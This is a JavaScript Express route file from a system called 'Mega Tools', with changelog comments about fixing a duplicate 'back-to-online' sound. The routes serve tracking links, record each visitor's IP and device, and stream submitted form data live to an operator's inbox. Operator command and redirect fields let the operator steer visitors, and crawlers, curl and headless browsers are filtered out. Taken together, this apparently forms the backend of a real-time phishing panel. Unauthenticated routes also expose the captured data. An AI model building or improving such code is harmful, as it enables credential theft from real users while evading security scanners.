// ============================================================
// MEGA TOOLS — DATA TRACKING ROUTES (ENTERPRISE v3.8)
// ============================================================
// FIX-D1..D24: retained.
//
// FIX-D25 (v3.8 — SINGLE EMIT SOURCE — forceOnline:false on delta):
//   Root cause of the "back-to-online sound twice / flicker"
//   reported after FIX-S54:
//     The HTTP data routes (/visit, /click, /submit, /heartbeat,
//     GET /:code) still passed `forceOnline: true` on their
//     `sessionDelta` when the session flipped Offline→Online.
//     Meanwhile the single authoritative eventBus in
//     Session.upsert (FIX-S29) also fired a `sessionStatusDelta`
//     with forceOnline:true. FE's two handlers (hD + hStatus)
//     each scheduled a back-to-online sound with a DIFFERENT
//     transitionId — the token dedupe could not collapse them.
//
//   FIX:
//     1) `emitSessionEvents` now ALWAYS sends `forceOnline: false`
//        on its `sessionDelta`. The state change still reaches the
//        FE immediately (type: 'updated', isLive, status) — but
//        the sound is NEVER scheduled from this channel.
//     2) The only path that fires the back-to-online sound is now
//        the eventBus in Session.upsert (FIX-S29) →
//        server.js sessionStatusDelta. Single source, single
//        transitionId, exactly one sound.
//     3) `transitionId` is now taken from `result.transitionId`
//        (created inside Session.upsert FIX-S29) — no more
//        `Date.now()` generated here.
//     4) All other behaviour (bot UA filter, IP throttle,
//        submit burst limiter, check-redirect, session-by-id,
//        session detail) is unchanged.
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { toStringId, parseTrackingCode, now } = require('../utils/helpers');
const { normalizeVisitorId, ownerCodeOf } = require('../utils/identity');

function detectDeviceClass(uaRaw) {
  const ua = String(uaRaw || '').toLowerCase();
  if (!ua) return 'Unknown';
  if (
    ua.includes('iphone') ||
    ua.includes('ipad') ||
    ua.includes('ipod') ||
    ua.includes('macintosh') ||
    ua.includes('mac os x') ||
    ua.includes('macos')
  ) return 'Apple';
  if (ua.includes('android')) return 'Android';
  if (
    ua.includes('windows nt') ||
    ua.includes('windows phone') ||
    ua.includes('win64') ||
    ua.includes('win32') ||
    ua.includes('windows')
  ) return 'Windows';
  if (ua.includes('linux') || ua.includes('cros') || ua.includes('x11')) return 'Desktop';
  return 'Unknown';
}

function isLikelyBot(uaRaw) {
  const u = String(uaRaw || '').toLowerCase();
  if (!u) return true;
  if (u.length < 20) return true;
  if (/bot\b|crawler|spider|scraper|phantom|puppeteer|selenium|playwright/i.test(u)) return true;
  if (/(python-requests|python\/|curl\/|wget\/|httpie|go-http|java\/|okhttp|libwww|aiohttp)/i.test(u)) return true;
  if (/headlesschrome|headless/i.test(u)) return true;
  return false;
}

let cachedUsers = null;
let userCacheTime = 0;
const USER_CACHE_TTL = 30000;

async function getCachedUsers() {
  if (!cachedUsers || Date.now() - userCacheTime > USER_CACHE_TTL) {
    cachedUsers = await db.users.read();
    userCacheTime = Date.now();
  }
  return cachedUsers;
}

const visitThrottle = new Map();
const VISIT_THROTTLE_MS = 60 * 1000;

const submitThrottle = new Map();
const SUBMIT_THROTTLE_MS = 3000;

function normalizeClientIp(ip) {
  const raw = String(ip || '').trim();
  if (!raw) return 'unknown';
  const mapped = raw.replace(/^::ffff:/i, '');
  if (mapped === '::1' || mapped === '127.0.0.1' || mapped.startsWith('127.')) return 'local';
  return mapped;
}

function shouldSkipVisit(visitorId, trackingCode, clientIp) {
  if (!visitorId && !trackingCode) return false;
  const ipKey = normalizeClientIp(clientIp);
  const keyBase = trackingCode
    ? ('owner:' + ownerCodeOf(trackingCode) + '|ip:' + ipKey)
    : ('vid:' + String(visitorId || 'nov') + '|ip:' + ipKey);
  const nowMs = Date.now();
  const last = visitThrottle.get(keyBase);
  if (last && (nowMs - last) < VISIT_THROTTLE_MS) return true;
  visitThrottle.set(keyBase, nowMs);
  if (visitThrottle.size > 5000) {
    const cutoff = nowMs - VISIT_THROTTLE_MS * 2;
    for (const [k, v] of visitThrottle.entries()) {
      if (v < cutoff) visitThrottle.delete(k);
    }
  }
  return false;
}

function shouldSkipSubmit(sessionId) {
  if (!sessionId) return false;
  const key = String(sessionId);
  const nowMs = Date.now();
  const last = submitThrottle.get(key);
  if (last && (nowMs - last) < SUBMIT_THROTTLE_MS) return true;
  submitThrottle.set(key, nowMs);
  if (submitThrottle.size > 2000) {
    const cutoff = nowMs - SUBMIT_THROTTLE_MS * 2;
    for (const [k, v] of submitThrottle.entries()) {
      if (v < cutoff) submitThrottle.delete(k);
    }
  }
  return false;
}

async function findLinkBySlug(slug) {
  if (!slug) return null;
  const all = await db.links.read();
  return all.find(l => l.baseCode === slug || l.slug === slug || l.uniqueCode === slug) || null;
}

async function getChainTargetUrl(link, identity, actionCode) {
  if (!link || !link.is_chain || !link.chain_links?.length) {
    return { url: link?.baseUrl || 'about:blank', chainStep: null, chainStepName: '' };
  }
  if (actionCode) {
    const stepIndex = link.chain_links.findIndex(cl => cl.actionCode === actionCode);
    if (stepIndex >= 0) {
      return { url: link.chain_links[stepIndex].url, chainStep: stepIndex, chainStepName: link.chain_links[stepIndex].name || '' };
    }
  }
  const nextUrl = await Link.getNextChainUrl(link, identity);
  return { url: nextUrl?.url || link.chain_links[0].url, chainStep: nextUrl?.index ?? 0, chainStepName: nextUrl?.name || link.chain_links[0].name || '' };
}

function buildSessionDelta(session, type, opts = {}) {
  const seq = (() => {
    try {
      const t = new Date(session.lastActivity || session.updated_at || 0).getTime();
      return Number.isFinite(t) && t > 0 ? t : Date.now();
    } catch (_) { return Date.now(); }
  })();
  const transitionId = opts.transitionId || `${session._id}:${Date.now()}`;
  return {
    type,
    seq,
    transitionId,
    forceOnline: !!opts.forceOnline,
    timestamp: new Date().toISOString(),
    session: {
      _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
      isLive: session.isLive, status: session.status || 'Online', lastActivity: session.lastActivity,
      clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
      deviceClass: session.deviceClass,
      baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
      ip: session.ip, browser: session.browser, formData: session.formData,
      redirectHistory: session.redirectHistory || [],
      lastCommand: session.lastCommand, lastCommandUrl: session.lastCommandUrl, commandSeq: session.commandSeq,
      lockedKeys: session.lockedKeys || [],
    },
  };
}

function buildSessionMetaDelta(session) {
  return {
    type: 'updated',
    timestamp: new Date().toISOString(),
    session: {
      _id: session._id,
      status: session.status || 'Online',
      clicks: session.clicks,
      formData: session.formData,
      isLive: session.isLive,
      lastActivity: session.lastActivity,
      lockedKeys: session.lockedKeys || [],
      submissionCount: Array.isArray(session.submissions) ? session.submissions.length : 0,
      deviceClass: session.deviceClass,
      deviceType: session.deviceType,
    },
  };
}

function emitToOwnerRoom(io, trackingCode, event, data) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  io.to('room_' + ownerCode).emit(event, data);
}

// FIX-D25: sessionDelta is a STATE channel only — forceOnline is
// ALWAYS false. The authoritative offline→online sound source is
// the eventBus in Session.upsert (FIX-S29) → server.js
// sessionStatusDelta.
async function emitSessionEvents(io, session, isNew, link, opts = {}) {
  if (!io || !session) return;
  const tc = session.trackingCode || session.baseCode || '';
  const ownerCode = tc.includes('_') ? tc.split('_')[0] : tc;
  if (!ownerCode) return;
  io.to('room_' + ownerCode).emit(
    'sessionDelta',
    buildSessionDelta(session, isNew ? 'new' : 'updated', {
      forceOnline: false,
      transitionId: opts.transitionId,
    })
  );
  if (link && isNew) { await Link.incrementClicks(link._id); }
}

function getClientIdentity(req) {
  const bodyVid =
    req.body?.visitorId ||
    req.query?.visitorId ||
    req.query?.vid ||
    req.query?.v ||
    null;
  const ip = req.body?.ip || req.ip || '::1';
  return {
    visitorId: bodyVid || ip || null,
    ip,
  };
}

function getResolvedVisitorId(visitorId, trackingCode) {
  return normalizeVisitorId({ visitorId, ip: null, trackingCode });
}

function buildFullTrackingCode(parsedTC, slug, fullCode) {
  if (parsedTC && slug) return parsedTC + '_' + slug;
  return parsedTC || fullCode || 'direct';
}

// ============================================================
// SMART REDIRECT (GET /:code)
// ============================================================
router.get('/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';
    const { trackingCode, slug, actionCode } = parseTrackingCode(code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(trackingCode, slug, code);
    const baseCode = slug || code;
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    const deviceClass = detectDeviceClass(ua);
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: ua.substring(0, 500),
      deviceType,
      deviceClass,
      entryUrl: baseCode,
      currentUrl: code,
      collectedTypes: ['visit'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      chainStep,
      chainStepName,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: 'about:blank' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io');
    const transitionId = result.transitionId || undefined;
    await emitSessionEvents(io, session, isNew, link, { transitionId });
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false, redirectDelay: 1000 });
  } catch (err) { console.error('[Data] GET /:code error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CLICK TRACKING — FIX-D24: bot UA rejected
// ============================================================
router.get('/click/:code', async (req, res) => {
  try {
    const ua = req.headers['user-agent'] || '';
    if (isLikelyBot(ua)) {
      return res.json({ success: false, bot: true, message: 'Bot traffic ignored', targetUrl: 'about:blank' });
    }
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode, slug, actionCode } = parseTrackingCode(req.params.code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(trackingCode, slug, req.params.code);
    const baseCode = slug || req.params.code;
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    const deviceClass = detectDeviceClass(ua);
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: ua.substring(0, 500),
      deviceType,
      deviceClass,
      entryUrl: baseCode,
      currentUrl: req.params.code,
      collectedTypes: ['click'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      chainStep,
      chainStepName,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: 'about:blank' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io');
    const transitionId = result.transitionId || undefined;
    await emitSessionEvents(io, session, isNew, link, { transitionId });
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Click error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CHECK REDIRECT
// ============================================================
router.get('/check-redirect/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode, slug } = parseTrackingCode(code);
    const all = await db.sessions.read(); let session = null;
    if (visitorId) session = all.find(s => s.visitorId === visitorId && s.isLive);
    if (!session && trackingCode) session = all.find(s => s.trackingCode === trackingCode && s.isLive);
    if (session) { const link = await findLinkBySlug(slug); let redirectUrl = session.currentUrl || link?.baseUrl || ''; if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, visitorId || ip, null); redirectUrl = chainResult.url; } res.json({ success: true, redirectUrl, session, message: session.lastMessage || '' }); }
    else { res.json({ success: false, redirectUrl: null, message: null }); }
  } catch (err) { console.error('[Data] Check redirect error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// VISIT (POST) — FIX-D23 (IP throttle) + FIX-D24 (bot UA)
// ============================================================
router.post('/visit', async (req, res) => {
  try {
    const { trackingCode, browser, device, collectedTypes } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';

    if (isLikelyBot(ua)) {
      return res.json({ success: true, bot: true, throttled: true, targetUrl: '', session: null });
    }

    const { trackingCode: parsedTC, slug, actionCode } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(parsedTC, slug, trackingCode || 'unknown');
    const baseCode = slug || trackingCode || 'direct_visit';
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || ''; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    const uaDeviceClass = detectDeviceClass(ua);
    const bodyDeviceClass = typeof device === 'string' &&
      ['Apple', 'Android', 'Windows', 'Desktop', 'Unknown'].includes(device)
      ? device
      : null;
    const deviceClass = bodyDeviceClass || uaDeviceClass;
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    if (shouldSkipVisit(resolvedVisitorId, finalTrackingCode, ip)) {
      const all = await db.sessions.read();
      const ownerCode = ownerCodeOf(finalTrackingCode);
      const existing = all.find(s =>
        !s.hiddenForAll && (
          s.visitorId === resolvedVisitorId ||
          ownerCodeOf(s.trackingCode) === ownerCode ||
          (Array.isArray(s.trackingCodeHistory) &&
            s.trackingCodeHistory.some(h => ownerCodeOf(h) === ownerCode))
        )
      ) || null;
      return res.json({ success: true, session: existing, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false, throttled: true });
    }

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: browser || ua.substring(0, 500),
      deviceType,
      deviceClass,
      entryUrl: baseCode,
      currentUrl: trackingCode || '',
      collectedTypes: collectedTypes || ['visit'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      chainStep,
      chainStepName,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: '' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io');
    const transitionId = result.transitionId || undefined;
    await emitSessionEvents(io, session, isNew, link, { transitionId });
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Visit error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// FORM SUBMIT — FIX-D24: bot UA + submit burst limiter
// ============================================================
router.post('/submit', async (req, res) => {
  try {
    const { formData, trackingCode, collectedTypes, browser, device } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';

    if (isLikelyBot(ua)) {
      return res.json({ success: false, bot: true, message: 'Bot traffic ignored' });
    }

    if (!formData) return res.status(400).json({ success: false, message: 'formData required' });
    const { trackingCode: parsedTC, slug } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(parsedTC, slug, trackingCode || 'direct');
    const baseCode = slug || trackingCode || 'direct_submit';
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    const enrichedFormData = { ...formData, submittedAt: now() };

    const uaDeviceClass = detectDeviceClass(ua);
    const bodyDeviceClass = typeof device === 'string' &&
      ['Apple', 'Android', 'Windows', 'Desktop', 'Unknown'].includes(device)
      ? device
      : null;
    const deviceClass = bodyDeviceClass || uaDeviceClass;
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    const all = await db.sessions.read();
    const ownerCode = ownerCodeOf(finalTrackingCode);
    const preExisting = all.find(s => !s.hiddenForAll && (
      s.visitorId === resolvedVisitorId ||
      ownerCodeOf(s.trackingCode) === ownerCode ||
      (Array.isArray(s.trackingCodeHistory) &&
        s.trackingCodeHistory.some(h => ownerCodeOf(h) === ownerCode))
    )) || null;

    if (preExisting && shouldSkipSubmit(preExisting._id)) {
      return res.json({ success: true, throttled: true, message: 'Too fast — please wait', duplicate: true });
    }

    const wasDuplicate = preExisting
      ? (
          Session.isDuplicateSubmission(preExisting.submissions || [], formData) ||
          Session.isSupersetOrSubset(preExisting.submissions || [], formData)
        )
      : false;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: browser || 'Unknown',
      deviceType,
      deviceClass,
      entryUrl: baseCode,
      currentUrl: trackingCode || '',
      collectedTypes: [...(collectedTypes || []), 'form_submit'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      formData: enrichedFormData,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code' });
    }

    const { session } = result;
    const io = req.app.get('io');
    if (io) {
      emitToOwnerRoom(io, finalTrackingCode, 'sessionMetaDelta', buildSessionMetaDelta(session));

      const payload = {
        formData: enrichedFormData,
        submissionCount: Array.isArray(session.submissions) ? session.submissions.length : 1,
        sessionId: session._id,
        visitorId: session.visitorId,
        duplicate: !!wasDuplicate,
        timestamp: now(),
      };
      emitToOwnerRoom(io, finalTrackingCode, 'formSubmitted', payload);
    }

    res.json({
      success: true,
      message: 'Form submitted',
      session,
      totalSubmissions: session.submissions?.length || 1,
      duplicate: wasDuplicate,
    });
  } catch (err) {
    console.error('[Data] Submit error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// HEARTBEAT — FIX-D22 + FIX-D25: state channel only, sound via
// eventBus (Session.upsert FIX-S29)
// ============================================================
router.post('/heartbeat', async (req, res) => {
  try {
    const { trackingCode, browser, device, status } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';

    const resolvedVisitorId = getResolvedVisitorId(visitorId, trackingCode || '');

    if (!resolvedVisitorId && !trackingCode) {
      return res.json({ success: false, message: 'visitorId or trackingCode required', isLive: false, status: 'Offline' });
    }

    const uaDeviceClass = detectDeviceClass(ua);
    const bodyDeviceClass = typeof device === 'string' &&
      ['Apple', 'Android', 'Windows', 'Desktop', 'Unknown'].includes(device)
      ? device
      : null;
    const deviceClass = bodyDeviceClass || uaDeviceClass;
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      trackingCode: trackingCode || '',
      baseCode: trackingCode || '',
      ip,
      browser: browser || ua.substring(0, 500),
      deviceType,
      deviceClass,
      collectedTypes: ['heartbeat'],
      status: status || undefined
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', isLive: false, status: 'Offline' });
    }

    const { session } = result;

    // FIX-D25: no forceOnline emission here. If a real flip happened,
    // Session.upsert already fired the eventBus (FIX-S29). We only
    // forward a plain state delta (forceOnline:false) so the FE
    // refreshes its UI without any duplicate sound.
    const sessionCode = session.trackingCode || session.baseCode || '';
    if (sessionCode) {
      const io = req.app.get('io');
      try {
        await emitSessionEvents(io, session, false, null, {
          transitionId: result.transitionId || undefined,
        });
      } catch (_) {}
    }

    res.json({ success: true, isLive: session?.isLive, status: session?.status, lastActivity: session?.lastActivity });
  } catch (err) { console.error('[Data] Heartbeat error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// SESSION DETAILS (by visitorId)
// ============================================================
router.get('/session/:visitorId', async (req, res) => {
  try {
    const session = await Session.findByVisitorId(req.params.visitorId);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
    res.json({ success: true, session });
  } catch (err) { console.error('[Data] Session error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// SESSION DETAILS by _id — used by LiveInboxPage.reconcileSession
// ============================================================
router.get('/session-by-id/:id', async (req, res) => {
  try {
    const id = req.params.id;
    if (!id) return res.status(400).json({ success: false, message: 'id required' });
    const session = await Session.findById(id);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
    res.json({ success: true, session });
  } catch (err) {
    console.error('[Data] Session-by-id error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

module.exports = router;